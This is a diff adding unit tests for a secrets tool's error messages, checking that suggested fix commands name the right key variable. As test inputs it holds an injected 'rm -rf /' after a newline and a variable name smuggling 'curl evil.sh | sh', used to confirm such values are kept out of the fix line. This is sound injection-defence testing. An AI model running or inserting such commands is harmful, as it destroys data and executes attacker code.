@@ -6,8 +6,10 @@
 import { describe, expect, test } from 'bun:test';
 import {
   SecretsFileInvalidError,
+  SecretsKeyInvalidError,
   SecretsKeyMismatchError,
   SecretsKeyMissingError,
+  SecretsRingKeyInvalidError,
   SecretsTamperedError,
 } from './secrets-errors';
 
@@ -93,5 +95,33 @@ describe('the three git checkout lines', () => {
     );
     expect(error.cause).toContain('kid-a');
     expect((error.meta as { sealedWith?: string }).sealedWith).toBe('kid-a\nrm -rf /');
+  });
+});
+
+describe('X_SECRETS_KEY_INVALID', () => {
+  const shape = { at: 'ULTIMATE_SECRETS_KEY', found: 3, expected: 64 };
+
+  test('the current key keeps its shipped line', () => {
+    expect(new SecretsKeyInvalidError(shape).fix).toBe(
+      'export ULTIMATE_SECRETS_KEY="$(cat .secrets.key)"   # the key file holds the 64 characters verbatim, no newline of its own',
+    );
+  });
+
+  test('a key read from a ring variable gets a fix that edits THAT variable', () => {
+    const error = new SecretsRingKeyInvalidError({
+      ...shape,
+      at: 'ULTIMATE_SECRETS_RETIRED_KEYS (entry 2)',
+      variable: 'ULTIMATE_SECRETS_RETIRED_KEYS',
+    });
+    expect(error.code).toBe('X_SECRETS_KEY_INVALID');
+    expect(error.fix).toStartWith('x secrets edit   # ULTIMATE_SECRETS_RETIRED_KEYS holds');
+    expect(error.fix).not.toContain('export');
+    expect(error.cause).toContain('ULTIMATE_SECRETS_RETIRED_KEYS (entry 2)');
+  });
+
+  test('a variable name that is not one never reaches the line', () => {
+    const error = new SecretsRingKeyInvalidError({ ...shape, variable: 'X; curl evil.sh | sh' });
+    expect(error.fix).not.toContain('curl');
+    expect(error.fix).toStartWith('x secrets edit   # the variable the cause names');
   });
 });
